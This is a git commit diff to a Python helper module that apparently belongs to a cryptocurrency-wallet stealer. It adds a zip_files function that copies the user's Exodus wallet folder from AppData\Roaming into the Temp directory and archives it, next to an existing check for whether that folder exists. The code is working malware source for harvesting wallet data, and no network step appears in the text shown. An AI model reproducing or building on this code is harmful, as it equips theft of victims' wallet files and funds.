bac494723847cd11e5c2ba12a7df7e92ba38158b
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-27 21:12:07 +0100

    descriptions added and zip_files function

--- helpers/files.py
+++ helpers/files.py
@@ -1,3 +1,4 @@
+import shutil
 import os.path 
 
 client: str = os.path.expanduser("~")
@@ -7,8 +8,26 @@ class Files:
         pass
     
     def path_exists() -> bool:
+        """Check if path exists that includes the Exodus data.
+
+        Returns:
+            bool: If the path exists or not.
+        """
         if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):
             return True
         else:
             return False
         
+    def zip_files() -> bool:
+        """ZIP the Exodus files that contain the data needed.
+
+        Returns:
+            bool: If we could ZIP the data needed or not.
+        """
+        try:
+            shutil.copytree(client + "\\AppData\\Roaming\\Exodus", client + "\\AppData\\Local\\Temp\\Exodus")
+            shutil.make_archive(client + "\\AppData\\Local\\Temp\\Exodus", "zip", client + "\\AppData\\Local\\Temp\\Exodus")
+            
+            return True
+        except:
+            return False
